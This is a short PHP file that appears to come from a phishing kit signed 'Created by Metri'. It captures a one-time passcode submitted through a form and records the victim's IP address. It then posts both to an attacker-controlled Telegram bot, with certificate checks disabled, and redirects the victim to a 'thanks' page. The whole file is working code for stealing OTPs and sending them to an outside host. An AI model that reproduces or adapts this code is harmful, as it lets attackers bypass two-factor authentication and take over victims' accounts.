<?php
include 'config.php';
$ip = getenv("REMOTE_ADDR");
$message .= "=====SMS1====="."\n";
$message .= "otp: ".$_POST['otp']."\n";
$message .= "IP: ".$ip."\n";
$message .= "-----Created by Metri-----"."\n";
$website = "https://api.telegram.org/" . $token_telegram;
$params=[
    'chat_id'=>$chat_id,
    'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);



include './txt.php';   
           header("Location: thanks.php");


?> 